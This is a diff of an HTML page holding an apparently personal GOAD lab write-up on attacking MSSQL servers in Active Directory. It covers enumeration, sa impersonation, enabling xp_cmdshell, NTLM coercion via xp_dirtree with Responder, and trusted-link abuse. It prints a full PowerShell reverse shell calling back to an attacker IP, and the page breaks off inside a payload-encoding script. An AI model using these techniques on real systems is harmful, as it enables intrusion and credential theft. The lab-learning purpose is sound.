@@ -26,7 +26,7 @@
     .part-navigation { display: flex; justify-content: space-between; margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); }
     .part-navigation a { color: var(--orange-yellow-crayola); text-decoration: none; display: flex; align-items: center; gap: 5px; transition: color 0.3s; }
     .part-navigation a:hover { color: var(--white-2); }
-    .sidebar-info_more { display: block !important; max-height: calc(100vh - 200px); overflow-y: auto; }
+    .sidebar-info_more { display: block !important; }
     .goad-sidebar-list { list-style: none; padding: 0; max-height: calc(100vh - 300px); overflow-y: auto; min-height: 200px; }
     .goad-sidebar-list li { margin-bottom: 5px; }
     .goad-sidebar-list a { color: var(--light-gray); text-decoration: none; display: block; padding: 8px 12px; border-radius: 8px; transition: all 0.3s; font-size: var(--fs-7); }
@@ -38,8 +38,6 @@
 </head>
 <body>
   <main>
-
-    <!-- Sidebar -->
     <aside class="sidebar" data-sidebar>
       <div class="sidebar-info">
         <figure class="avatar-box">
@@ -54,45 +52,36 @@
           <ion-icon name="chevron-down"></ion-icon>
         </button>
       </div>
-
       <div class="sidebar-info_more">
         <div class="separator"></div>
-        
         <a href="../index.html" class="back-link">
           <ion-icon name="arrow-back-outline"></ion-icon>
           Back to Portfolio
         </a>
-        
         <div class="separator"></div>
-        
         <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
-        
         <ul class="goad-sidebar-list">
-          <li><a href="index.html" class="">Overview</a></li>
-          <li><a href="part-1-reconnaissance.html" class="">Part 1: Reconnaissance & Scan</a></li>
-          <li><a href="part-2-finding-users.html" class="">Part 2: Finding Users</a></li>
-          <li><a href="part-3-authenticated-enumeration.html" class="">Part 3: Auth Enum</a></li>
-          <li><a href="part-4-ntlm-relaying.html" class="">Part 4: NTLM Relay</a></li>
-          <li><a href="part-5-adcs.html" class="">Part 5: ADCS</a></li>
+          <li><a href="index.html">Overview</a></li>
+          <li><a href="part-1-reconnaissance.html" >Part 1: Reconnaissance & Scan</a></li>
+          <li><a href="part-2-finding-users.html" >Part 2: Finding Users</a></li>
+          <li><a href="part-3-authenticated-enumeration.html" >Part 3: Auth Enum</a></li>
+          <li><a href="part-4-ntlm-relaying.html" >Part 4: NTLM Relay</a></li>
+          <li><a href="part-5-adcs.html" >Part 5: ADCS</a></li>
           <li><a href="part-6-mssql.html" class="active">Part 6: MSSQL</a></li>
-          <li><a href="part-7-privilege-escalation.html" class="">Part 7: PrivEsc</a></li>
-          <li><a href="part-8-lateral-move.html" class="">Part 8: Lateral Move</a></li>
-          <li><a href="part-9-delegations.html" class="">Part 9: Delegations</a></li>
-          <li><a href="part-10-acl.html" class="">Part 10: ACL</a></li>
-          <li><a href="part-11-trusts.html" class="">Part 11: Trusts</a></li>
-          <li><a href="part-12-having-fun.html" class="">Part 12: Having Fun</a></li>
+          <li><a href="part-7-privilege-escalation.html" >Part 7: PrivEsc</a></li>
+          <li><a href="part-8-lateral-move.html" >Part 8: Lateral Move</a></li>
+          <li><a href="part-9-delegations.html" >Part 9: Delegations</a></li>
+          <li><a href="part-10-acl.html" >Part 10: ACL</a></li>
+          <li><a href="part-11-trusts.html" >Part 11: Trusts</a></li>
+          <li><a href="part-12-having-fun.html" >Part 12: Having Fun</a></li>
         </ul>
-
         <div class="separator"></div>
-        
-        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Other Labs:</p>
-        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Related Labs:</p>
         <ul class="goad-sidebar-list">
+          <li><a href="../goad-minilab/">GOAD-MINILAB</a></li>
           <li><a href="../ninja-hacker-academy/">Ninja Hacker Academy</a></li>
         </ul>
-
         <div class="separator"></div>
-        
         <ul class="social-list">
           <li class="social-item">
             <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
@@ -102,483 +91,324 @@
         </ul>
       </div>
     </aside>
-
     <div class="main-content">
       <article class="about active" data-page="about">
         <header class="h2 article-title">Part 6: MSSQL</header>
         <section class="goad-content">
-<strong>GOAD - part 6 - MSSQL - Done</strong>
+<p># <strong>Enumerate the MSSQL servers</strong></p>
 
-<p>
-    # <strong>Enumerate the MSSQL servers</strong>
-</p>
-
-<p>
-    Let’s say we are in the begging of a pentesting and we have a network  and we want to find out if theres any MSSQL servers in the network.
-    We can start by enumerating MSSQL using NMAP
-</p>
+<p>    Let’s say we are in the begging of a pentesting and we have a network  and we want to find out if theres any MSSQL servers in the network.</p>
+<p>    We can start by enumerating MSSQL using NMAP</p>
 
     <code>sudo nmap -Pn -p 1433 -sV -sC 10.4.10.10-23</code>
 
-    <img src="images/image-279.png" alt="Untitled">
+    <img src="images/image-166.png" alt="Untitled">
 
-    <img src="images/image-280.png" alt="Untitled">
+    <img src="images/image-167.png" alt="Untitled">
 
-<p>
-    It’s possible to see above that our NMAP scan output shows us 2 hosts configured with MSSQL service, <strong>*Braavos.essos.local</strong>* and <strong>*castleblack.north.sevenkingdoms.local</strong>* are running as MSSQL server.
-</p>
+<p>    It’s possible to see above that our NMAP scan output shows us 2 hosts configured with MSSQL service, <strong>*Braavos.essos.local</strong>* and <strong>*castleblack.north.sevenkingdoms.local</strong>* are running as MSSQL server.</p>
 
-<p>
-    since we already know that we do have 2 hosts running MSSQL service, we can now start by enumerating the service unauthenticated and also authenticated using NetExec.
-</p>
+<p>    since we already know that we do have 2 hosts running MSSQL service, we can now start by enumerating the service unauthenticated and also authenticated using NetExec.</p>
 
-<p>
-    ## <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a>
-</p>
+<p>    ## [NetExec](https://github.com/Pennyw0rth/NetExec)</p>
 
-<p>
-    This project was initially created in 2015 by @byt3bl33d3r, known as CrackMapExec. In 2019 @mpgn_x64 started maintaining the project for the next 4 years, adding a lot of great tools and features. In September 2023 he retired from maintaining the project. So from now on I’ll be using Netexec instead of CrackMapExec.
-</p>
+<p>    This project was initially created in 2015 by @byt3bl33d3r, known as CrackMapExec. In 2019 @mpgn_x64 started maintaining the project for the next 4 years, adding a lot of great tools and features. In September 2023 he retired from maintaining the project. So from now on I’ll be using Netexec instead of CrackMapExec.</p>
 
-<p>
-    ### Enumerating MSSQL unauthenticated
-</p>
+<p>    ### Enumerating MSSQL unauthenticated</p>
 
-<p>
-    We already know that we do have 2 servers running as MSSQL server so we can try to enumerate it using NetExec unauthenticated.
-</p>
+<p>    We already know that we do have 2 servers running as MSSQL server so we can try to enumerate it using NetExec unauthenticated.</p>
 
     <code>netexec mssql 10.4.10.22-23</code>
 
-    <img src="images/image-281.png" alt="Untitled">
+    <img src="images/image-168.png" alt="Untitled">
 
-<p>
-    ### Enumerating MSSQL authenticated
-</p>
+<p>    ### Enumerating MSSQL authenticated</p>
 
-<p>
-    Assuming that we do have a valid user on the domain, we can also use NetExec to enumerate the service using a valid user.
-</p>
+<p>    Assuming that we do have a valid user on the domain, we can also use NetExec to enumerate the service using a valid user.</p>
 
     <code>netexec mssql 10.4.10.22 -u 'samwell.tarly' -p 'Heartsbane' -d 'north.sevenkingdoms.local’</code>
 
-    <img src="images/image-282.png" alt="Untitled">
+    <img src="images/image-169.png" alt="Untitled">
 
-<p>
-    The output above shows us a <code>[+]</code> signal, it means that this user has access to MSSQL database.
-</p>
+<p>    The output above shows us a <code>[+]</code> signal, it means that this user has access to MSSQL database.</p>
 
-<p>
-    Since we do have a valid user for this MSSQL database, we can use <a href="http://mssqlclient.py">mssqlclient.py</a> from impacket to login into MSSQL service.
-</p>
+<p>    Since we do have a valid user for this MSSQL database, we can use [mssqlclient.py](http://mssqlclient.py) from impacket to login into MSSQL service.</p>
 
-    <a href="http://mssqlclient.py/"><code>mssqlclient.py</a> -windows-auth 'north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local'</code>
+<p>    [<code>mssqlclient.py](http://mssqlclient.py/) -windows-auth 'north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local'</code></p>
 
-    <img src="images/image-283.png" alt="Untitled">
+    <img src="images/image-170.png" alt="Untitled">
 
-<p>
-    We have accessed the MSSQL server. that’s great.
-</p>
+<p>    We have accessed the MSSQL server. that’s great.</p>
 
-<p>
-    ### Enumerating MSSQL
-</p>
+<p>    ### Enumerating MSSQL</p>
 
-<p>
-    Once we are inside MSSQL server using <a href="http://mssqlclient.py">mssqlclient.py</a> from impacket, we do have lots of options to start our MSSQL enumeration.
-</p>
+<p>    Once we are inside MSSQL server using [mssqlclient.py](http://mssqlclient.py) from impacket, we do have lots of options to start our MSSQL enumeration.</p>
 
-<p>
-    Let’s start by enumerating login users.
-</p>
+<p>    Let’s start by enumerating login users.</p>
 
     <code>enum_logins</code>
 
-<p>
-    The just issued command will make the following request to MSSQL database:
-</p>
+<p>    The just issued command will make the following request to MSSQL database:</p>
 
-    <pre><code class="language-bash">    select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, 
-<p>
-    sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin 
-    from  master.sys.server_principals r 
-    left join master.sys.syslogins sl on sl.sid = r.sid 
-    where r.type in ('S','E','X','U','G')
-</p>
+<p>    <pre><code class="language-bash">    select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, </p>
+<p>    sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin </p>
+<p>    from  master.sys.server_principals r </p>
+<p>    left join master.sys.syslogins sl on sl.sid = r.sid </p>
+<p>    where r.type in ('S','E','X','U','G')</p>
     </code></pre>
 
-    <img src="images/image-284.png" alt="Untitled">
+    <img src="images/image-171.png" alt="Untitled">
 
-<p>
-    This is the output we get from the database query. This output shows that we are simply basic viewer users, meaning we don’t have high privilege role in this database.
-</p>
+<p>    This is the output we get from the database query. This output shows that we are simply basic viewer users, meaning we don’t have high privilege role in this database.</p>
 
-<p>
-    # <strong>Impersonate - execute as login</strong>
-</p>
+<p>    # <strong>Impersonate - execute as login</strong></p>
 
-<p>
-    Let’s see if we can enumerate some valid impersonation here. 
-</p>
+<p>    Let’s see if we can enumerate some valid impersonation here. </p>
 
     <code>enum_impersonate</code>
 
-<p>
-    the command issued above will make the following queries into the MSSQL database listing all login with impersonation permission:
-</p>
+<p>    the command issued above will make the following queries into the MSSQL database listing all login with impersonation permission:</p>
 
-    <pre><code class="language-bash">    SELECT 'LOGIN' as 'execute as','' AS 'database', 
-<p>
-    pe.permission_name, pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' 
-    FROM sys.server_permissions pe 
-    JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_Id 
-    JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
-</p>
+<p>    <pre><code class="language-bash">    SELECT 'LOGIN' as 'execute as','' AS 'database', </p>
+<p>    pe.permission_name, pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' </p>
+<p>    FROM sys.server_permissions pe </p>
+<p>    JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_Id </p>
+<p>    JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'</p>
     </code></pre>
 
-<p>
-    The same request will also issue the request on each database in this MSSQL server:
-</p>
+<p>    The same request will also issue the request on each database in this MSSQL server:</p>
 
-    <pre><code class="language-bash">    use <db>;
-<p>
-    SELECT 'USER' as 'execute as', DB_NAME() AS 'database',
-    pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' 
-    FROM sys.database_permissions pe 
-    JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_Id 
-    JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
-</p>
+<p>    <pre><code class="language-bash">    use &lt;db&gt;;</p>
+<p>    SELECT 'USER' as 'execute as', DB_NAME() AS 'database',</p>
+<p>    pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' </p>
+<p>    FROM sys.database_permissions pe </p>
+<p>    JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_Id </p>
+<p>    JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'</p>
     </code></pre>
 
-<p>
-    > Login and User, what is the difference ?
-    > 
-    > - A “Login” grants the principal entry into the <strong>SERVER</strong>
-    > - A “User” grants a login entry into a single <strong>DATABASE</strong>
-</p>
+<p>    > Login and User, what is the difference ?</p>
+<p>    > </p>
+<p>    > - A “Login” grants the principal entry into the <strong>SERVER</strong></p>
+<p>    > - A “User” grants a login entry into a single <strong>DATABASE</strong></p>
 
-<p>
-    *“SQL Login is for Authentication and SQL Server User is for Authorization. Authentication can decide if we have permissions to access the server or not and Authorization decides what are different operations we can do in a database. Login is created at the SQL Server instance level and User is created at the SQL Server database level. We can have multiple users from a different database connected to a single login to a server.”*
-</p>
+<p>    *“SQL Login is for Authentication and SQL Server User is for Authorization. Authentication can decide if we have permissions to access the server or not and Authorization decides what are different operations we can do in a database. Login is created at the SQL Server instance level and User is created at the SQL Server database level. We can have multiple users from a different database connected to a single login to a server.”*</p>
 
-    <img src="NINJA%20HACKER%20ACADEMY/images/image-493.png" alt="images/image-493.png">
+    <img src="images/image-172.png" alt="mssql_login_vs_user.png">
 
-<p>
-    As we can see from the output, our user Samwell.Tarly can make queries to this database as user <code>sa</code>.
-    The <strong><code>sa</code></strong> account is the built-in super user account for MSSQL and has full administrative privileges.
-</p>
+<p>    As we can see from the output, our user Samwell.Tarly can make queries to this database as user <code>sa</code>.</p>
+<p>    The <strong><code>sa</code></strong> account is the built-in super user account for MSSQL and has full administrative privileges.</p>
 
-    <img src="images/image-285.png" alt="Untitled">
+    <img src="images/image-173.png" alt="Untitled">
 
-<p>
-    So <code>Samwell.Tarly</code> user can impersonate user <code>sa</code>. Let’s impersonate <code>sa</code> user and execute OS commands with <strong>*xp_cmdshell</strong>*.
-</p>
+<p>    So <code>Samwell.Tarly</code> user can impersonate user <code>sa</code>. Let’s impersonate <code>sa</code> user and execute OS commands with <strong>*xp_cmdshell</strong>*.</p>
 
-    <code>exec_as_login sa</code> = It’s equivalent to <code>execute as login='sa';</code>query.
-    <code>enable_xp_cmdshell</code> = It’s equivalent to <code>exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;</code>query.
-    <code>xp_cmdshell whoami</code> = I’ts equivalent to <code>exec master..xp_cmdshell 'whoami'</code> query.
+<p>    <code>exec_as_login sa</code> = It’s equivalent to <code>execute as login='sa';</code>query.</p>
+<p>    <code>enable_xp_cmdshell</code> = It’s equivalent to <code>exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;</code>query.</p>
+<p>    <code>xp_cmdshell whoami</code> = I’ts equivalent to <code>exec master..xp_cmdshell 'whoami'</code> query.</p>
 
-    <img src="images/image-287.png" alt="Untitled">
+    <img src="images/image-174.png" alt="Untitled">
 
-<p>
-    As stated on the screenshot above, as can see that we were able to impersonate the high privileged user <code>sa</code> and we can now execute OS commands as <code>sa</code>.
-    Now let’s do the enumeration as <code>sa</code> user.
-</p>
+<p>    As stated on the screenshot above, as can see that we were able to impersonate the high privileged user <code>sa</code> and we can now execute OS commands as <code>sa</code>.</p>
+<p>    Now let’s do the enumeration as <code>sa</code> user.</p>
 
-<p>
-    We can see below that we can execute all kinds of OS commands and here we do have an example. we can see everything in the dir <code>C:\</code>.
-</p>
+<p>    We can see below that we can execute all kinds of OS commands and here we do have an example. we can see everything in the dir <code>C:\</code>.</p>
 
-    <code>EXEC xp_cmdshell "dir C:\"
-<p>
-    xp_cmdshell dir C:\</code>
-</p>
+<p>    <code>EXEC xp_cmdshell "dir C:\"</p>
+<p>    xp_cmdshell dir C:\</code></p>
 
-    <img src="images/image-288.png" alt="Untitled">
+    <img src="images/image-175.png" alt="Untitled">
 
-<p>
-    ### Let’s Continue our MSSQL enumeration
-</p>
+<p>    ### Let’s Continue our MSSQL enumeration</p>
 
     <code>enum_logins</code>
 
-<p>
-    Now it’s possible to see that we can now see away more users since we are requesting with a highly privileged user.
-</p>
+<p>    Now it’s possible to see that we can now see away more users since we are requesting with a highly privileged user.</p>
 
-    <img src="images/image-289.png" alt="Untitled">
+    <img src="images/image-176.png" alt="Untitled">
 
-<p>
-    It’s possible to see from the screenshot above several users, and we can see as well that user <code>jon.snow</code> is SysAdmin since we can see its <code>sysadmin</code> status to <code>1</code>same as <code>sa</code> user.
-</p>
+<p>    It’s possible to see from the screenshot above several users, and we can see as well that user <code>jon.snow</code> is SysAdmin since we can see its <code>sysadmin</code> status to <code>1</code>same as <code>sa</code> user.</p>
 
-<p>
-    Let’s try to impersonate other users as well, let’s see if there’s another impersonation privilege here.
-</p>
+<p>    Let’s try to impersonate other users as well, let’s see if there’s another impersonation privilege here.</p>
 
     <code>enum_impersonate</code>
 
-    <img src="images/image-290.png" alt="Untitled">
+    <img src="images/image-177.png" alt="Untitled">
 
-<ul>
-<li>As sysadmin user <code>sa</code> we can see all the information in the database and so the others users with impersonation privileges.</li>
-<li>Another way to get in could be to access as brandon.stark and do <code>execute as login</code> on user jon.snow.</li>
-</ul>
+<p>    - As sysadmin user <code>sa</code> we can see all the information in the database and so the others users with impersonation privileges.</p>
+<p>    - Another way to get in could be to access as brandon.stark and do <code>execute as login</code> on user jon.snow.</p>
 
-<p>
-    # I<strong>mpersonate - Execute as user</strong>
-</p>
+<p>    # I<strong>mpersonate - Execute as user</strong></p>
 
-<p>
-    Now this time let’s connect to the DB as <code>arya.stark</code>.
-</p>
+<p>    Now this time let’s connect to the DB as <code>arya.stark</code>.</p>
 
-    <a href="http://mssqlclient.py/"><code>mssqlclient.py</a> -windows-auth 'north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local'</code>
+<p>    [<code>mssqlclient.py](http://mssqlclient.py/) -windows-auth 'north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local'</code></p>
 
-    <img src="images/image-291.png" alt="Untitled">
+    <img src="images/image-178.png" alt="Untitled">
 
-<p>
-    Enumerating databases.
-</p>
+<p>    Enumerating databases.</p>
     <code>select name from master.dbo.sysdatabases;</code>
 
-    <img src="images/image-292.png" alt="Untitled">
+    <img src="images/image-179.png" alt="Untitled">
 
-<p>
-    Let’s use master database.
-</p>
+<p>    Let’s use master database.</p>
     <code>use master;</code>
 
-<p>
-    Now let’s enumerate and see if the user <code>ayra.stark</code> can impersonate other user.
-</p>
+<p>    Now let’s enumerate and see if the user <code>ayra.stark</code> can impersonate other user.</p>
 
     <code>enum_impersonate</code>
 
-    <img src="images/image-293.png" alt="Untitled">
+    <img src="images/image-180.png" alt="Untitled">
 
-<p>
-    Our enumeration shows us that <code>arya.stark</code> can impersonate <code>dbo</code> in <strong>*master</strong>* and <strong>*msdb</strong>* database.
-</p>
+<p>    Our enumeration shows us that <code>arya.stark</code> can impersonate <code>dbo</code> in <strong>*master</strong>* and <strong>*msdb</strong>* database.</p>
 
-<p>
-    We use master db and impersonate user dbo but we can’t execute OS Commands. Errors are shown on the screenshot below.
-</p>
+<p>    We use master db and impersonate user dbo but we can’t execute OS Commands. Errors are shown on the screenshot below.</p>
 
-    <img src="images/image-294.png" alt="Untitled">
+    <img src="images/image-181.png" alt="Untitled">
 
-<p>
-    Now let’s change the database to <code>msdb</code>. 
-</p>
+<p>    Now let’s change the database to <code>msdb</code>. </p>
 
     <code>use msdb;</code>
 
-<p>
-    The difference between the two databases is that <code>msdb</code> got the trustworthy property set, trustworthy property is set by default on <code>msdb</code> database.
-</p>
+<p>    The difference between the two databases is that <code>msdb</code> got the trustworthy property set, trustworthy property is set by default on <code>msdb</code> database.</p>
 
     <code>enum_db</code>
 
-    <img src="images/image-295.png" alt="Untitled">
+    <img src="images/image-182.png" alt="Untitled">
 
-<p>
-    So putting things together after enumeration.
-    based on the <code>enum_impersonate</code> command we can see that we user <code>ayra.stark</code> can impersonate <code>dbo</code> on <code>msdb</code> database and since trustworthy set is enabled by default on <code>msdb</code> database, we can take advantage by abusing this and get OS command execution
-</p>
+<p>    So putting things together after enumeration.</p>
+<p>    based on the <code>enum_impersonate</code> command we can see that we user <code>ayra.stark</code> can impersonate <code>dbo</code> on <code>msdb</code> database and since trustworthy set is enabled by default on <code>msdb</code> database, we can take advantage by abusing this and get OS command execution</p>
 
-    <code>use msdb
-<p>
-    exec_as_user dbo
-    enable_xp_cmdshell
-    xp_cmdshell whoami</code>
-</p>
+<p>    <code>use msdb</p>
+<p>    exec_as_user dbo</p>
+<p>    enable_xp_cmdshell</p>
+<p>    xp_cmdshell whoami</code></p>
 
-    <img src="images/image-296.png" alt="Untitled">
+    <img src="images/image-183.png" alt="Untitled">
 
-    <code>xp_cmdshell dir C:\
-<p>
-    EXEC xp_cmdshell "dir C:\"</code>
-</p>
+<p>    <code>xp_cmdshell dir C:\</p>
+<p>    EXEC xp_cmdshell "dir C:\"</code></p>
 
-    <img src="images/image-298.png" alt="Untitled">
+    <img src="images/image-184.png" alt="Untitled">
 
-<p>
-    # MSSQL NTLM Stealing
-</p>
+<p>    # MSSQL NTLM Stealing</p>
 
-<p>
-    MSSQL NTLM stealing is an attack where an MSSQL server is tricked into authenticating to an attacker-controlled SMB or web server, capturing NTLM hashes in the process. This works by abusing MSSQL commands like <code>xp_dirtree</code> or <code>xp_fileexist</code>, which trigger outbound connections. The attacker sets up a malicious SMB server (e.g., using Responder) and injects commands into the server to force the connection. Once the NTLM hash is captured, it can be cracked or relayed to gain further access.
-</p>
+<p>    MSSQL NTLM stealing is an attack where an MSSQL server is tricked into authenticating to an attacker-controlled SMB or web server, capturing NTLM hashes in the process. This works by abusing MSSQL commands like <code>xp_dirtree</code> or <code>xp_fileexist</code>, which trigger outbound connections. The attacker sets up a malicious SMB server (e.g., using Responder) and injects commands into the server to force the connection. Once the NTLM hash is captured, it can be cracked or relayed to gain further access.</p>
 
-<p>
-    To defend against this, disable unnecessary features like <code>xp_cmdshell</code>, restrict outbound connections, enforce strong passwords, and monitor for suspicious activity.
-</p>
+<p>    To defend against this, disable unnecessary features like <code>xp_cmdshell</code>, restrict outbound connections, enforce strong passwords, and monitor for suspicious activity.</p>
 
-<p>
-    MSSQL can also be use to coerce an <strong><code>NTLM</code></strong> authentication from the MSSQL server. The incoming connection will be from the user who run the MSSQL server.
-    In our case if we tale any user like <code>hodor</code> for example we can get an <strong><code>NTLM</code></strong> authentication using Responder.
-</p>
+<p>    MSSQL can also be use to coerce an <strong><code>NTLM</code></strong> authentication from the MSSQL server. The incoming connection will be from the user who run the MSSQL server.</p>
+<p>    In our case if we tale any user like <code>hodor</code> for example we can get an <strong><code>NTLM</code></strong> authentication using Responder.</p>
 
     <code>show_query</code>
     <code>exec master.sys.xp_dirtree '\\10.4.10.1\demontlm',1,1</code>
 
-    <img src="images/image-299.png" alt="Untitled">
+    <img src="images/image-185.png" alt="Untitled">
 
     <code>sudo responder -I vmnet2 -dwP -vvv</code>
 
-    <img src="images/image-300.png" alt="Untitled">
+    <img src="images/image-186.png" alt="Untitled">
 
-<p>
-    This will work also with ntlmrelayx (like with a server running as administrator and with the same password on other servers)
-</p>
+<p>    This will work also with ntlmrelayx (like with a server running as administrator and with the same password on other servers)</p>
 
-<p>
-    # T<strong>rusted Links</strong>
-</p>
+<p>    # T<strong>rusted Links</strong></p>
 
-<p>
-    SQL can also be abused with the usage of MSSQL trusted links.
-</p>
+<p>    SQL can also be abused with the usage of MSSQL trusted links.</p>
 
-<p>
-    > *Note that trusted link is also a forest to forest technique*
-    > 
-</p>
+<p>    > *Note that trusted link is also a forest to forest technique*</p>
+<p>    > </p>
 
     <code>enum_links</code>
 
-<p>
-    This command will make the following requests to the database:
-</p>
+<p>    This command will make the following requests to the database:</p>
 
-    <code>EXEC sp_linkedservers
-<p>
-    EXEC sp_helplinkedsrvlogin</code>
-</p>
+<p>    <code>EXEC sp_linkedservers</p>
+<p>    EXEC sp_helplinkedsrvlogin</code></p>
 
-    <img src="images/image-301.png" alt="Untitled">
+    <img src="images/image-187.png" alt="Untitled">
 
-<p>
-    As we can see above a linked server exist with the name BRAAVOS and a mapping exist with the user <code>jon.snow</code> as Local Login and <code>sa</code>  as Remote Login on <strong>braavos</strong>. This way we use this trusted link to get command injection on BRAAVOS server.
-</p>
+<p>    As we can see above a linked server exist with the name BRAAVOS and a mapping exist with the user <code>jon.snow</code> as Local Login and <code>sa</code>  as Remote Login on <strong>braavos</strong>. This way we use this trusted link to get command injection on BRAAVOS server.</p>
 
-    <code>use_link BRAAVOS</code> = It’s equivalent to <code>EXEC ('select system_user as "username"') AT BRAAVOS</code> query.
-    <code>enable_xp_cmdshell</code> = It’s equivalent to <code>EXEC ('exec master.dbo.sp_configure ''show advanced options'',1;RECONFIGURE;exec master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE;') AT BRAAVOS</code> query.
-    <code>xp_cmdshell whoami</code> =  It’s equivalent to <code>EXEC ('exec master..xp_cmdshell ''whoami''') AT BRAAVOS</code> query.
+<p>    <code>use_link BRAAVOS</code> = It’s equivalent to <code>EXEC ('select system_user as "username"') AT BRAAVOS</code> query.</p>
+<p>    <code>enable_xp_cmdshell</code> = It’s equivalent to <code>EXEC ('exec master.dbo.sp_configure ''show advanced options'',1;RECONFIGURE;exec master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE;') AT BRAAVOS</code> query.</p>
+<p>    <code>xp_cmdshell whoami</code> =  It’s equivalent to <code>EXEC ('exec master..xp_cmdshell ''whoami''') AT BRAAVOS</code> query.</p>
 
-    <img src="images/image-302.png" alt="Untitled">
+    <img src="images/image-188.png" alt="Untitled">
 
-<p>
-    We got a command injection on braavos.essos.local as essos\sql_svc. Since we got Command Injection on BRAAVOS MSSQL server via Trusted Link, We can also Coerce and Relay to be able to get NTLM hash of the user running this MSSQL Server.
-</p>
+<p>    We got a command injection on braavos.essos.local as essos\sql_svc. Since we got Command Injection on BRAAVOS MSSQL server via Trusted Link, We can also Coerce and Relay to be able to get NTLM hash of the user running this MSSQL Server.</p>
 
-<p>
-    # <strong>Coerce and relay</strong>
-</p>
+<p>    # <strong>Coerce and relay</strong></p>
 
-<p>
-    MSSQL can also be use to coerce an <strong><code>NTLM</code></strong> authentication from the MSSQL server. 
-    The incoming connection will be from the user who run the MSSQL server.
-    In our case if we tale any user like <code>hodor</code> for example we can get an <strong><code>NTLM</code></strong> authentication using Responder.
-</p>
+<p>    MSSQL can also be use to coerce an <strong><code>NTLM</code></strong> authentication from the MSSQL server. </p>
+<p>    The incoming connection will be from the user who run the MSSQL server.</p>
+<p>    In our case if we tale any user like <code>hodor</code> for example we can get an <strong><code>NTLM</code></strong> authentication using Responder.</p>
 
-    <code>show_query
-<p>
-    exec master.sys.xp_dirtree '\\10.4.10.1\demontlm',1,1</code>
-</p>
+<p>    <code>show_query</p>
+<p>    exec master.sys.xp_dirtree '\\10.4.10.1\demontlm',1,1</code></p>
 
-    <img src="images/image-303.png" alt="Untitled">
+    <img src="images/image-189.png" alt="Untitled">
 
     <code>sudo responder -I vmnet2 -dwP -vvv</code>
 
-    <img src="images/image-304.png" alt="Untitled">
+    <img src="images/image-190.png" alt="Untitled">
 
-<p>
-    # <strong>Command execution to shell</strong>
-</p>
+<p>    # <strong>Command execution to shell</strong></p>
 
-<p>
-    We got command execution on castelblack and also on braavos. But now we want a shell to interact with the server.
-    To get a shell we can use a basic Powershell webshell:
-</p>
+<p>    We got command execution on castelblack and also on braavos. But now we want a shell to interact with the server.</p>
+<p>    To get a shell we can use a basic Powershell webshell:</p>
 
-    <pre><code class="language-powershell">    $c = New-Object System.Net.Sockets.TCPClient('10.4.10.1',4444);
-<p>
-    $s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
-    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
-        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
-        $sb = (iex $d 2>&1 | Out-String );
-        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
-        $s.Write($sb,0,$sb.Length);
-        $s.Flush()
-    };
-    $c.Close()
-</p>
+<p>    <pre><code class="language-powershell">    $c = New-Object System.Net.Sockets.TCPClient('10.4.10.1',4444);</p>
+<p>    $s = $c.GetStream();[byte[]]$b = 0..65535|%{0};</p>
+<p>    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){</p>
+<p>        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);</p>
+<p>        $sb = (iex $d 2&gt;&amp;1 | Out-String );</p>
+<p>        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps&gt; ');</p>
+<p>        $s.Write($sb,0,$sb.Length);</p>
+<p>        $s.Flush()</p>
+<p>    };</p>
+<p>    $c.Close()</p>
     </code></pre>
 
-<p>
-    Let’s convert this powershell command to base64 in utf-16 for powershell
-</p>
+<p>    Let’s convert this powershell command to base64 in utf-16 for powershell</p>
 
-    <pre><code class="language-python">    #!/usr/bin/env python
-<p>
-    import base64
-    import sys
-</p>
+<p>    <pre><code class="language-python">    #!/usr/bin/env python</p>
+<p>    import base64</p>
+<p>    import sys</p>
 
-<p>
-    if len(sys.argv) < 3:
-      print('usage : %s ip port' % sys.argv[0])
-      sys.exit(0)
-</p>
+<p>    if len(sys.argv) &lt; 3:</p>
+<p>      print('usage : %s ip port' % sys.argv[0])</p>
+<p>      sys.exit(0)</p>
 
-<p>
-    payload="""
